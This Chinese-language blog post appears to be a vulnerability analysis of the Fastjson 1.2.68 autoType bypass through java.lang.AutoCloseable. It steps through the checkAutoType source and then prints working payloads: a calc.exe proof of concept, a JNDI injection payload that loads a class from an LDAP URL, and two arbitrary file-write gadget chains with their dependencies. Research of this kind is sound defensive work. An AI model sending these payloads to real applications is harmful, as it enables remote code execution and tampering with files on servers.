<p>更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 <code>checkAutoType()</code> 中直接抛出异常，也就是完全禁止 autoType</p>
<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>在这个版本中主要是通过利用<code>checkAutoType</code>中的参数<code>expectClass</code></p>
<p><img src="image-20220714111209933.png" alt="image-20220714111209933" loading="lazy"></p>
<p>在<code>ParserConfig#checkAutoType</code>中, 如果想要加载的类不在白名单中，如果开启了<code>autoTypeSupport</code>或者<code>expectClassFalg</code>为<code>True</code>都是可以的，这里我们需要在不开启<code>autoTypeSupport</code>的情况下，加载类，所以我们需要使得后者为true</p>
<p><img src="image-20220714111626350.png" alt="image-20220714111626350" loading="lazy"></p>
<p>如上图所示，想要<code>expectClassFlag</code>满足条件，就需要绕过这些内置的黑名单了</p>
<p>所以绕过的方法为：</p>
<ol>
<li>以某个类作为<code>expectClass</code>参数传入<code>checkAutoType</code></li>
<li>查找反序列化<code>expectClass</code>的子类或实现，如果构造方法或setter中含有其它类型可重复第一步构造一个反序列化链，直到找到可以利用的类为止</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="总体"><a href="#总体" class="headerlink" title="总体"></a>总体</h4><p>我们需要寻找有哪些类或者接口可以通过校验，存有：</p>
<ul>
<li>白名单（符合白名单条件的类）</li>
<li>TypeUtils.mappings （符合缓存映射中获取的类）</li>
<li>typeMapping （ParserConfig中本身带有的集合）</li>
<li>deserializers （符合反序列化器的类）</li>
</ul>
<p>在<code>TypeUtils#getClassFromMapping</code>处打下断点，查看<code>TypeUtils.mappings</code>的可用类或接口</p>
<p><img src="image-20220714145618683.png" alt="image-20220714145618683" loading="lazy"></p>
<p>这里面有很多，比如这个<code>java.lang.AutoCloseable</code>接口</p>
<p><img src="image-20220714151415653.png" alt="image-20220714151415653" loading="lazy"></p>
<p>使用的是<code>JavaBeanDeserializer</code>反序列化器， 在实例化对象的时候因为该类型是接口，则将会继续解析下一个JSON字段</p>
<p><img src="image-20220714152232914.png" alt="image-20220714152232914" loading="lazy"></p>
<p>如果存在而且为类型（@Type修饰）</p>
<p><img src="image-20220714152446321.png" alt="image-20220714152446321" loading="lazy"></p>
<p>就将这个接口作为<code>expectClass</code>参数传入<code>checkAutoType</code>检测下一个类型</p>
<p><img src="image-20220714152639294.png" alt="image-20220714152639294" loading="lazy"></p>
<p>很明显，这里不会被拦截，使得<code>expectClassFlag</code>为<code>true</code></p>
<p><img src="image-20220714153651528.png" alt="image-20220714153651528" loading="lazy"></p>
<p>直接一路来到了类加载，绕过了<code>AutoType</code>的检测，成功加载了恶意类</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">pers<span class="token punctuation">.</span>fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Fj68TestPoc</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"pers.fastjson.Fj68Test\", \"cmd\":\"calc.exe\"&#125;"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对于<code>java.lang.AutoCloseable</code>的实现非常多，我们需要挖掘实现其的类</p>
<p><img src="image-20220714154031766.png" alt="image-20220714154031766" loading="lazy"></p>
<h4 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h4><ol>
<li><p>期望类存在黑名单过滤</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">==</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span>
            <span class="token operator">||</span> expectClass <span class="token operator">==</span> <span class="token class-name">Serializable</span><span class="token punctuation">.</span><span class="token keyword">class</span>
            <span class="token operator">||</span> expectClass <span class="token operator">==</span> <span class="token class-name">Cloneable</span><span class="token punctuation">.</span><span class="token keyword">class</span>
            <span class="token operator">||</span> expectClass <span class="token operator">==</span> <span class="token class-name">Closeable</span><span class="token punctuation">.</span><span class="token keyword">class</span>
            <span class="token operator">||</span> expectClass <span class="token operator">==</span> <span class="token class-name">EventListener</span><span class="token punctuation">.</span><span class="token keyword">class</span>
            <span class="token operator">||</span> expectClass <span class="token operator">==</span> <span class="token class-name">Iterable</span><span class="token punctuation">.</span><span class="token keyword">class</span>
            <span class="token operator">||</span> expectClass <span class="token operator">==</span> <span class="token class-name">Collection</span><span class="token punctuation">.</span><span class="token keyword">class</span>
            <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        expectClassFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        expectClassFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>黑名单类，fastjson 在 denyHashCodes 里几乎把常见的容易造成漏洞的类都加进了黑名单，这就造成了攻击成本变高，如果要利用漏洞，只能花费更多的时间去寻未被发现的常用库 gadget</p>
</li>
<li><p>父类、父接口黑名单，fastjson 在判断期望类之前将继承自 ClassLoader、DataSource、RowSet 的类直接抛出异常。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment">// classloader is danger</span>
        <span class="token operator">||</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span>DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment">// dataSource can load jdbc driver</span>
        <span class="token operator">||</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span>RowSet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token comment">//</span>
        <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而常用的 JNDI RCE 类基本上都继承自 DataSource 和 RowSet，所以能找到的 JNDI gadget 基本都无法在这个漏洞中使用。</p>
<p>以上三点足够让大部分常见的 gadget 无法使用</p>
</li>
</ol>
<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>这里主要是针对<code>1.2.50</code>版本及以前，因为在<code>51</code>版本就把<code>OracleJDBCRowSet</code>加入了黑名单</p>
<p>想要利用这个需要有<code>oracle jdbc</code>依赖</p>
<p><img src="image-20220714175935483.png" alt="image-20220714175935483" loading="lazy"></p>
<p>可以知道这里是实现了<code>java.lang.AutoCloseable</code>接口的，可以绕过<code>autoTypeSupport</code></p>
<p>调用链如下</p>
<p><img src="image-20220714181112733.png" alt="image-20220714181112733" loading="lazy"></p>
<p>在<code>OracleJDBCRowSet#getConnection</code>中<code>lookup</code>的参数可控，通过调用<code>getDataSourceName</code>方法得到</p>
<p>跟进方法，为其父类的方法，且存在相应属性</p>
<p><img src="image-20220714181425807.png" alt="image-20220714181425807" loading="lazy"></p>
<p>那怎么调用<code>getConnection</code>方法呢？</p>
<p>在setCommand方法中存在调用</p>
<p><img src="image-20220714181615802.png" alt="image-20220714181615802" loading="lazy"></p>
<p>我们就可以设定一个<code>command</code>属性值，触发他的<code>setter</code>方法，达到触发漏洞的目的</p>
<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
    <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
    <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"oracle.jdbc.rowset.OracleJDBCRowSet"</span><span class="token punctuation">,</span>
    <span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:9999/Evil"</span><span class="token punctuation">,</span>
    <span class="token string">"command"</span><span class="token operator">:</span><span class="token string">"a"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h4><h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><p>浅蓝给的思路：</p>
<blockquote>
<ul>
<li>需要一个通过 set 方法或构造方法指定文件路径的 OutputStream</li>
<li>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream</li>
<li>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 flush 方法</li>
</ul>
</blockquote>
<ul>
<li>指定文件路径的 排错</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
	<span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
	<span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.io.FileOutputStream"</span><span class="token punctuation">,</span>
	<span class="token string">"file"</span><span class="token operator">:</span> <span class="token string">"/tmp/test.txt"</span><span class="token punctuation">,</span>
	<span class="token string">"append"</span><span class="token operator">:</span> <span class="token string">"false"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是这里出现了问题:</p>
<p><img src="image-20220714223056778.png" alt="image-20220714223056778" loading="lazy"></p>
<p>原因是在<code>JavaBeanInfo#build</code>方法中调用<code>ASMUtils.lookupParameterNames(constructor)</code>方法获取构造方法的参数名。如果没找到，则抛出上述异常</p>
<p>使用<code>javap -l &lt;classname&gt;</code>判断是否包含参数名信息</p>
<p><img src="image-20220714223607711.png" alt="image-20220714223607711" loading="lazy"></p>
<p>对比发现不同的JDK不一样</p>
<h6 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h6><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    '@type'<span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
    '@type'<span class="token operator">:</span>'sun.rmi.server.MarshalOutputStream'<span class="token punctuation">,</span>
    'out'<span class="token operator">:</span>
    <span class="token punctuation">&#123;</span>
        '@type'<span class="token operator">:</span>'java.util.zip.InflaterOutputStream'<span class="token punctuation">,</span>
        'out'<span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
           '@type'<span class="token operator">:</span>'java.io.FileOutputStream'<span class="token punctuation">,</span>
           'file'<span class="token operator">:</span>'/tmp/fj_hack_jdk11'<span class="token punctuation">,</span>
           'append'<span class="token operator">:</span><span class="token boolean">false</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        'infl'<span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
            'input'<span class="token operator">:</span>
            <span class="token punctuation">&#123;</span>
                'array'<span class="token operator">:</span>'eJzzSK1USMqv1FHwVEjMVQjKT8oPSS3KAABRJwdZ'<span class="token punctuation">,</span>
                'limit'<span class="token operator">:</span><span class="token number">30</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        'bufLen'<span class="token operator">:</span><span class="token number">1048576</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    'protocolVersion'<span class="token operator">:</span><span class="token number">1</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>条件</p>
<p>需要时带有调试信息的JDK才可以利用成功(JDK11)<br>同样可以改造成适用于JDK8的payload</p>
<blockquote>
<p>“input”: “eJzzSK1USMqv1FHwVEjMVQjKT8oPSS3KAABRJwdZ”</p>
</blockquote>
</li>
<li><p>简单分析</p>
<p>我们就按照内到外分析，通过<code>InflaterOutputStream</code>的构造方法传入out参数是一个<code>FileOutputStream</code>指定的输出流路径的输出流对象，而另一个参数是<code>infl</code>是一个<code>Inflater</code>对象，通过调用他的<code>setInput</code>方法，指定buffer数据，值得注意的是他会使用<code>com.alibaba.fastjson.serializer.ByteBufferCodec</code>这个反序列化器进行处理，该反序列化器会将数据先反序列化为<code>com.alibaba.fastjson.serializer.ByteBufferCodec$ByteBufferBean</code>，然后再调用<code>ByteBufferCodec$ByteBufferBean#byteBuffer()</code>方法返回<code>ByteBuffer</code>对象</p>
<p>最后呢，就通过最外层的<code>MarshalOutputStream</code>的构造方法，最终执行了<code>flush</code>，成功写入文件</p>
<p>因为这里存在一个解压数据的过程，我们就需要将想写入的数据，压缩之后base64编码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InflaterTest</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">zlibCompress</span><span class="token punctuation">(</span><span class="token class-name">String</span> message<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span>
    <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> chatacter<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> input <span class="token operator">=</span> message<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span>chatacter<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"input length "</span><span class="token operator">+</span>input<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>input<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">10</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Double</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span>length<span class="token operator">*</span><span class="token number">0.25f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>output<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Deflater</span> compresser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Deflater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        compresser<span class="token punctuation">.</span><span class="token function">setInput</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
        compresser<span class="token punctuation">.</span><span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> compressedDataLength <span class="token operator">=</span> compresser<span class="token punctuation">.</span><span class="token function">deflate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"compressedDataLength "</span><span class="token operator">+</span>compressedDataLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
        compresser<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> compressedDataLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">zlibInfCompress</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> barr<span class="token punctuation">,</span><span class="token class-name">String</span> charater<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result<span class="token operator">=</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>barr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">Inflater</span> inf<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Inflater</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        inf<span class="token punctuation">.</span><span class="token function">setInput</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> infLen<span class="token operator">=</span>inf<span class="token punctuation">.</span><span class="token function">inflate</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        inf<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> strOgr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span>charater<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"str ogr "</span><span class="token operator">+</span>strOgr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> infLen<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>

        <span class="token class-name">String</span> str<span class="token operator">=</span><span class="token string">"Hey boy, I am RoboTerh"</span><span class="token punctuation">;</span>

        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> def<span class="token operator">=</span> <span class="token class-name">InflaterTest</span><span class="token punctuation">.</span><span class="token function">zlibCompress</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> strBase<span class="token operator">=</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>def<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"str base64 string "</span><span class="token operator">+</span>strBase<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decStr<span class="token operator">=</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decodeBase64</span><span class="token punctuation">(</span>strBase<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decode_str<span class="token operator">=</span> <span class="token class-name">InflaterTest</span><span class="token punctuation">.</span><span class="token function">zlibInfCompress</span><span class="token punctuation">(</span>decStr<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> decStrOgr<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>decode_str<span class="token punctuation">,</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"decStrOgr "</span><span class="token operator">+</span>decStrOgr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h6 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h6><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    'stream'<span class="token operator">:</span>
    <span class="token punctuation">&#123;</span>
        '@type'<span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
        '@type'<span class="token operator">:</span>'org.eclipse.core.internal.localstore.SafeFileOutputStream'<span class="token punctuation">,</span>
        'targetPath'<span class="token operator">:</span>'/tmp/dst'<span class="token punctuation">,</span>
        'tempPath'<span class="token operator">:</span>'/tmp/src'
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    'writer'<span class="token operator">:</span>
    <span class="token punctuation">&#123;</span>
        '@type'<span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
        '@type'<span class="token operator">:</span>'com.esotericsoftware.kryo.io.Output'<span class="token punctuation">,</span>
        'buffer'<span class="token operator">:</span>'aGFja2VkIGJ5IFJvYm9UZXJoLg'<span class="token punctuation">,</span>
        'outputStream'<span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
            '$ref'<span class="token operator">:</span>'$.stream'
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        'position'<span class="token operator">:</span><span class="token number">19</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    'close'<span class="token operator">:</span>
    <span class="token punctuation">&#123;</span>
        '@type'<span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>
        '@type'<span class="token operator">:</span>'com.sleepycat.bind.serial.SerialOutput'<span class="token punctuation">,</span>
        'out'<span class="token operator">:</span>
        <span class="token punctuation">&#123;</span>
            '$ref'<span class="token operator">:</span>'$.writer'
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p>其他类似</p>
<p>当然还有其他的利用链，比如第一个类使用<code>org.apache.tools.ant.util.LazyFileOutputStream</code>指定输出流路径，第二个类使用<code>org.apache.solr.common.util.FastOutputStream</code>, 第三个使用<code>org.iq80.snappy.SnappyOutputStream</code></p>
</li>
<li><p>依赖：</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.aspectj<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>aspectjtools<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.esotericsoftware<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kryo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.sleepycat<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>je<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>18.3.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>简单分析</p>
<p>首先在<code>stream</code>中通过<code>SafeFileOutputStream</code>创建一个输出流对象，传入参数<code>targetPath</code> <code>tempPath</code>, 成功指定输出流路径<br>然后再<code>writer</code>中通过<code>Output</code>的无参构造方法，创建一个输出流对象，通过<code>buffer</code>的setter方法向缓冲区写入数据, 这里应该是base64，因为其调用链为<code>ObjectArrayCodec.deserializer -&gt; JSONScanner.bytesValue -&gt; IOUtils.decodeBase64</code>, 最后通过<code>ouputStream</code>的setter方法将输出流指向<code>stream</code>中</p>
<p>最后在<code>close</code>中通过<code>SerialOutput</code>创建一个输出流对象，并传入参数out, 指向writer中的输出流对象，最后会调用<code>ObjectOutputStream</code>的构造方法，最后调用<code>Output.flush</code>，成功写入</p>
<p><img src="image-20220715101135742.png" alt="image-20220715101135742" loading="lazy"></p>
